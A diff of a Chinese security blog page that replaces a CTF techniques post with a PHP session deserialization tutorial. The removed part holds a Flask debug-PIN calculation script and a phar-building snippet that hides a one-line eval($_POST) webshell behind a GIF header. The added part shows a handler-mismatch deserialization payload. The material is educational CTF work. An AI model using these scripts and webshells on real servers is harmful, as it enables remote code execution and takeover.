@@ -5,57 +5,26 @@
   
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
-  <link rel="dns-prefetch" href="http://example.com">
-  <title>Warrenli&#39;s blog</title>
+  <link rel="dns-prefetch" href="https://blog.warrenli.fun">
+  <title>php session 反序列化 | Warrenli&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="flask算pin要计算PIN码，需要private_bits 和public_bits  分别需要确定的是： 1 当前用户名 2 固定值  flask.app 3 固定值  Flask 4 当前脚本运行的绝对路径  可以从报错获取 5 uuid.getnode 6 machine_id 例题：  明显是要我们算pin码。 1.获取脚本运行绝对路径：&#x2F;usr&#x2F;local&amp;#x2">
+  <meta name="description" content="三种处理器php 处理器首先来看看session.serialize_handler等于 php时候的序列化结果，demo 如下： 123456&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();$_SESSION[&#x27;sessi">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Warrenli&#39;s blog">
-<meta property="og:url" content="http://example.com/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/index.html">
+<meta property="og:title" content="php session 反序列化">
+<meta property="og:url" content="https://blog.warrenli.fun/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="Warrenli&#39;s blog">
-<meta property="og:description" content="flask算pin要计算PIN码，需要private_bits 和public_bits  分别需要确定的是： 1 当前用户名 2 固定值  flask.app 3 固定值  Flask 4 当前脚本运行的绝对路径  可以从报错获取 5 uuid.getnode 6 machine_id 例题：  明显是要我们算pin码。 1.获取脚本运行绝对路径：&#x2F;usr&#x2F;local&amp;#x2">
+<meta property="og:description" content="三种处理器php 处理器首先来看看session.serialize_handler等于 php时候的序列化结果，demo 如下： 123456&lt;?phperror_reporting(0);ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);session_start();$_SESSION[&#x27;sessi">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737514731438-da3c0323-0146-4ed9-b9b3-7e2cdeb341ec.png">
-<meta property="og:image" content="http://example.com/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737514720696-5f6d6e43-8186-4bdc-b5fb-24fdbfb0dc66.png">
-<meta property="og:image" content="http://example.com/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737514816321-f41e4e3d-1506-4e7d-b621-27d5e8b2941a.png">
-<meta property="og:image" content="http://example.com/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737515082645-18779643-005d-43b0-a425-4a417682d3f0.png">
-<meta property="og:image" content="http://example.com/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737515109991-4a648aef-4b58-4771-ad49-c20c2e32ba81.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737515451817-dfc76c5a-546c-47e5-b109-8829ff120c39.png">
-<meta property="og:image" content="http://example.com/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737515556491-62148313-87da-49b8-89d0-44c27b79e531.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737596700164-fe940b10-1208-4122-ba86-415664aee9a4.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737595985213-0986b3bc-0e94-4dd9-a526-4673e785c5d5.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737595995381-3e5e3dbe-b169-4474-887e-6a77957149f9.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737596020841-02c6f80e-88f4-43e5-b7c4-18d345da32ad.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737598367324-3df55798-aba8-4099-a055-62ed78541e9e.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737598416314-ef735066-b35e-491a-b01b-ec7fb83bc20b.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737598448442-36eec9f3-1d88-4522-9edc-9d673be3f014.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737598653597-78076e4b-7c00-4b87-a8ae-cf86fdff03fc.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737598672502-93cf8f8b-0cdf-4d5c-8960-5e110b127c63.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737598726382-436e58b2-64f9-459c-a951-0146c2dd32b3.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737599060759-23204e5c-237c-4594-905d-a97fea024c45.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737599074977-70055793-cc2b-46a0-9dde-74bcc1f1ef82.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737684689217-39cfe111-3aba-4fbe-8d87-261f7820db10.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737684705933-cd14faec-8b20-4b7f-883d-9e255adc2839.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737684866918-f5bca782-a894-4ed6-9e4b-ce8e945412ce.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737687522322-07ca50ae-6bac-492e-b7ce-e47cdfd5b62b.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737687531563-12e311b3-d0d6-47da-a923-718d1a795ea2.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739702013852-2a566020-40f8-4aaa-85b3-93354eb86dcc.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739702196970-7994a2d3-a20a-4389-9c33-d47ed4e82d5e.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739702248552-3d050c9c-e1df-4110-b132-21b53257a8ae.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739702350333-fa4e9285-8396-4fa6-9a96-3995a338fc62.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739706729207-9894352c-7b1c-4a01-961c-6b92a0a566cc.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739706739103-3399e69b-c604-4912-a4f8-7d80ad70e099.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739706755075-26be979a-1e59-46af-85d4-aa663bddb289.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739706765444-cc0f66d0-56af-40d3-b636-fdca1bc40c2f.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739706778862-bec43b1a-3d71-4874-949b-d9e94c32dd59.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739706966733-d73c76de-ff8e-482e-8a36-9e1d18e445e6.png">
-<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2025/png/42899545/1739706980438-9409a761-9b1a-420d-9e57-c13041ff74c6.png">
-<meta property="article:published_time" content="2025-03-26T06:51:12.714Z">
-<meta property="article:modified_time" content="2025-03-26T06:51:25.881Z">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293287048-b53226f8-e683-4042-925a-5f6bc03b906e.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293514891-7e51d58b-beaa-4d7b-9211-737acdaa7607.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293526124-e212be59-1a8e-410b-bdc1-4f87cb9de90c.png">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293541065-1ccc3614-0831-471b-b826-b5f5082caab1.png">
+<meta property="article:published_time" content="2025-03-31T07:02:57.000Z">
+<meta property="article:modified_time" content="2025-03-31T07:02:57.629Z">
 <meta property="article:author" content="Warrenli">
 <meta property="article:tag" content="网安，web">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737514731438-da3c0323-0146-4ed9-b9b3-7e2cdeb341ec.png">
+<meta name="twitter:image" content="https://blog.warrenli.fun/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293287048-b53226f8-e683-4042-925a-5f6bc03b906e.png">
   
     <link rel="alternative" href="/atom.xml" title="Warrenli&#39;s blog" type="application/atom+xml">
   
@@ -179,226 +148,70 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-常用姿势" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-php session 反序列化" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      php session 反序列化
+    </h1>
+  
+
+        
+        <a href="/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="archive-article-date">
+  	<time datetime="2025-03-31T07:02:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-03-31</time>
+</a>
+        
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="flask算pin"><a href="#flask算pin" class="headerlink" title="flask算pin"></a>flask算pin</h1><p>要计算PIN码，需要private_bits 和public_bits </p>
-<p>分别需要确定的是：</p>
-<p>1 当前用户名</p>
-<p>2 固定值  flask.app</p>
-<p>3 固定值  Flask</p>
-<p>4 当前脚本运行的绝对路径  可以从报错获取</p>
-<p>5 uuid.getnode</p>
-<p>6 machine_id</p>
-<p>例题：</p>
-<p><img src="/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737514731438-da3c0323-0146-4ed9-b9b3-7e2cdeb341ec.png"></p>
-<p>明显是要我们算pin码。</p>
-<p>1.获取脚本运行绝对路径：&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py</p>
-<p><img src="/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737514720696-5f6d6e43-8186-4bdc-b5fb-24fdbfb0dc66.png"></p>
-<p>2.获取uuid：&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p>
-<p><img src="/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737514816321-f41e4e3d-1506-4e7d-b621-27d5e8b2941a.png"></p>
-<p><font style="color:rgb(0, 0, 0);">0242ac0cbf01—&gt;16进制转十进制：2485377613569</font></p>
-<p><font style="color:rgb(0, 0, 0);"></font></p>
-<p><font style="color:rgb(0, 0, 0);">3.machine_id</font></p>
-<p><font style="color:rgb(0, 0, 0);">&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id</font></p>
-<p><font style="color:rgb(0, 0, 0);">&#x2F;proc&#x2F;self&#x2F;cgroup</font></p>
-<p><img src="/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737515082645-18779643-005d-43b0-a425-4a417682d3f0.png"></p>
-<p><img src="/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737515109991-4a648aef-4b58-4771-ad49-c20c2e32ba81.png"></p>
-<p>两者拼接一下就是machine_id</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">225374fa-04bc-4346-9f39-48fa82829ca9627fb8d9e1725d1ffe910f52a89506be87d771bf863b1441fafaa02075c02fa1</span><br></pre></td></tr></table></figure>
+        <hr>
+<h2 id="三种处理器"><a href="#三种处理器" class="headerlink" title="三种处理器"></a>三种处理器</h2><h3 id="php-处理器"><a href="#php-处理器" class="headerlink" title="php 处理器"></a>php 处理器</h3><p>首先来看看<code>session.serialize_handler</code>等于 <code>php</code>时候的序列化结果，demo 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
+<p>序列化的结果为：<code>session|s:7:&quot;xianzhi&quot;;</code></p>
+<p><code>session</code> 为<code>$_SESSION[&#39;session&#39;]</code>的键名，<code>|</code>后为传入 GET 参数经过序列化后的值</p>
+<h3 id="php-serialize-处理器"><a href="#php-serialize-处理器" class="headerlink" title="php_serialize 处理器"></a>php_serialize 处理器</h3><p>最后就是<code>session.serialize_handler</code>等于 <code>php_serialize</code>时候的序列化结果，同理，demo 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
+<p>序列化的结果为：<code>a:1:&#123;s:7:&quot;session&quot;;s:7:&quot;xianzhi&quot;;&#125;</code></p>
+<p><code>a:1</code>表示<code>$_SESSION</code>数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值</p>
+<h3 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h3><p>再来看看<code>session.serialize_handler</code>等于 <code>php_binary</code>时候的序列化结果。</p>
+<p>demo 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_binary&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;sessionsessionsessionsessionsession&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p>脚本算pin：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPIN</span>(<span class="params">public_bits, private_bits</span>):</span><br><span class="line">    rv = <span class="literal">None</span></span><br><span class="line">    num = <span class="literal">None</span></span><br><span class="line">    h = hashlib.sha1()</span><br><span class="line">    <span class="keyword">for</span> bit <span class="keyword">in</span> chain(public_bits, private_bits):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">            bit = bit.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        h.update(bit)</span><br><span class="line">    h.update(<span class="string">b&quot;cookiesalt&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    cookie_name = <span class="string">f&quot;__wzd<span class="subst">&#123;h.hexdigest()[:<span class="number">20</span>]&#125;</span>&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># If we need to generate a pin we salt it a bit more so that we don&#x27;t</span></span><br><span class="line">    <span class="comment"># end up with the same value and generate out 9 digits</span></span><br><span class="line">    <span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        h.update(<span class="string">b&quot;pinsalt&quot;</span>)</span><br><span class="line">        num = <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>):09d&#125;</span>&quot;</span>[:<span class="number">9</span>]</span><br><span class="line">    <span class="comment"># Format the pincode in groups of digits for easier remembering if</span></span><br><span class="line">    <span class="comment"># we don&#x27;t have a result yet.</span></span><br><span class="line">    <span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">                rv = <span class="string">&quot;-&quot;</span>.join(</span><br><span class="line">                    num[x: x + group_size].rjust(group_size, <span class="string">&quot;0&quot;</span>)</span><br><span class="line">                    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size)</span><br><span class="line">                )</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            rv = num</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> rv, cookie_name</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    public_bits = [</span><br><span class="line">        <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"> </span><br><span class="line">    private_bits = [</span><br><span class="line">        <span class="string">&#x27;2485377605532&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;225374fa-04bc-4346-9f39-48fa82829ca9b411d864f4e593f4e388782956b10f2d5e11871e2ae5c13bc45e5e8cd18a766d&#x27;</span></span><br><span class="line">    ]</span><br><span class="line"> </span><br><span class="line">    PIN = getPIN(public_bits, private_bits)</span><br><span class="line">    <span class="built_in">print</span>(PIN)</span><br></pre></td></tr></table></figure>
+<p>为了更能直观的体现出格式的差别，因此这里设置了键值长度为 35，35 对应的 ASCII 码为<code>#</code>，所以最终的结果如下图所示：</p>
+<p>序列化的结果为：<code>#sessionsessionsessionsessionsessions:7:&quot;xianzhi&quot;;</code></p>
+<p><code>#</code>为键名长度对应的 ASCII 的值，<code>sessionsessionsessionsessionsessions</code>为键名，<code>s:7:&quot;xianzhi&quot;;</code>为传入 GET 参数经过序列化后的值</p>
+<h2 id="php-serialize和php处理器同时开启触发bug"><a href="#php-serialize和php处理器同时开启触发bug" class="headerlink" title="php_serialize和php处理器同时开启触发bug"></a>php_serialize和php处理器同时开启触发bug</h2><p>形成的原理就是在用<code>session.serialize_handler = php_serialize</code>存储的字符可以引入 | 。</p>
+<p>再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时， <code>|</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。</p>
+<p>举个简单的例子：</p>
+<p>定义一个<code>session.php</code>文件，用于传入 <code>session</code>值，文件内容如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php_serialize&#x27;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#x27;session&#x27;] = $_GET[&#x27;session&#x27;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737515451817-dfc76c5a-546c-47e5-b109-8829ff120c39.png"></p>
-<p><img src="/2025/03/26/%E5%B8%B8%E7%94%A8%E5%A7%BF%E5%8A%BF/1737515556491-62148313-87da-49b8-89d0-44c27b79e531.png"></p>
-<h1 id="phar文件包含"><a href="#phar文件包含" class="headerlink" title="phar文件包含"></a>phar文件包含</h1><blockquote>
-<p><font style="color:rgb(77, 77, 77);">phar:&#x2F;&#x2F;伪协议</font><br><font style="color:rgb(77, 77, 77);">这个就是php解压缩报的一个函数，不管后缀是什么，都会当做压缩包来解压，用法：?file&#x3D;phar:&#x2F;&#x2F;压缩包&#x2F;内部文件 phar:&#x2F;&#x2F;xxx.png&#x2F;shell.php 注意 PHP&gt;&#x3D;5.3.0压缩包需要是zip协议压缩，rar不行，将</font><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E6%9C%A8%E9%A9%AC&spm=1001.2101.3001.7020">木马</a><font style="color:rgb(77, 77, 77);">文件压缩后，改为其他任意格式的文件都可以正常使用。步骤：写一个一句话木马shell。php，然后用zip协议解压缩为shell.zip。然后将后缀改为png等其他格式</font></p>
-</blockquote>
-<p><font style="color:rgb(77, 77, 77);">例题一：</font></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$file = $_POST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">$content = $_POST[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset($content) &amp;&amp; !preg_match(<span class="string">&#x27;/php|data|ftp/i&#x27;</span>,$file))&#123;</span><br><span class="line">    <span class="keyword">if</span>(file_exists($file.<span class="string">&#x27;.txt&#x27;</span>))&#123;</span><br><span class="line">        include $file.<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        file_put_contents($file,$content);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>先看看<code>session</code>的初始内容，如下：</p>
+<p><code>a:1:&#123;s:7:&quot;session&quot;;s:5:&quot;hello&quot;;&#125;</code></p>
+<p>存在另一个<code>class.php</code> 文件，内容如下：</p>
+<p>实例化对象后，输出了<code>panda</code>。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line">  ini_set(&#x27;session.serialize_handler&#x27;,&#x27;php&#x27;);</span><br><span class="line">  session_start();</span><br><span class="line">    class XianZhi&#123;</span><br><span class="line">    public $name = &#x27;panda&#x27;;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">      echo &quot;Who are you?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">      echo &#x27;&lt;br&gt;&#x27;.$this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $str = new XianZhi();</span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><font style="color:rgb(77, 77, 77);">题目web目录下没有写权限，需要写到其他地方比如&#x2F;tmp下</font></p>
-<p><font style="color:rgb(77, 77, 77);">首先生成phar文件</font></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$phar = new Phar(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar -&gt; setStub(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&#x27;&lt;?php __HALT_COMPILER();?&gt;&#x27;</span>);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;a.txt&quot;</span>, <span class="string">&quot;&lt;?php eval(\$_POST[1]);?&gt;&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/03/31/php%20session%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1730293287048-b53226f8-e683-4042-925a-5f6bc03b906e.png"></p>
+<p>这两个文件的作用很清晰，<code>session.php</code>文件的处理器是<code>php_serialize</code>，<code>class.php</code>文件的处理器是<code>php</code>，<code>session.php</code>文件的作用是传入可控的 <code>session</code>值，<code>class.php</code>文件的作用是在反序列化开始前输出<code>Who are you?</code>，反序列化结束的时候输出<code>name</code>值。</p>
+<p>这两个文件如果想要利用，我们要在<code>session.php</code>文件传入<code>|</code>+<code>序列化</code>格式的值，然后再次访问<code>class.php</code>文件的时候，就会在调用<code>session</code>值的时候，触发此 BUG。</p>
+<p>首先生成序列化字符串，利用 payload 如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class XianZhi&#123;</span><br><span class="line">    public $name;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">      echo &quot;Who are you?&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">      echo &#x27;&lt;br&gt;&#x27;.$this-&gt;name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $str = new XianZhi();</span><br><span class="line">    $str-&gt;name = &quot;xianzhi&quot;;</span><br><span class="line">    echo serialize($str);</span><br><span class="line">  ?&gt;</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.nlark.com/yuque/0/2025/png/42899545/1737596700164-fe940b10-1208-4122-ba86-415664aee9a4.png"></p>
-<p><font style="color:rgb(77, 77, 77);">接着上传文件，这里用python是因为我们要写的是一个二进制文件，键盘不好打（open函数）。</font></p>
